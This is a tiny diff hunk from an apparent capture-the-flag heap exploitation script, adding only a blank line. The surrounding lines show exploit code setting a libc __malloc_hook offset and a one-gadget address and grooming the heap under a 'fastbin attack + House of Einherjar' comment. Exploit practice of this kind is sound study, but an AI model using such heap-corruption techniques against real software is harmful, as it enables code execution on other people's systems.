@@ -52,6 +52,7 @@ def exploit(r):
     target_chunk = heap_base+0x5d8
     malloc_hook = libc_base+0x3c4b10
     one_shot = libc_base+0xf0274
+
     ## FASTBIN ATTACK + HOUSE OF EINHERJAR
     addNote(0x80, 4)
     addNote(0x68, 5)
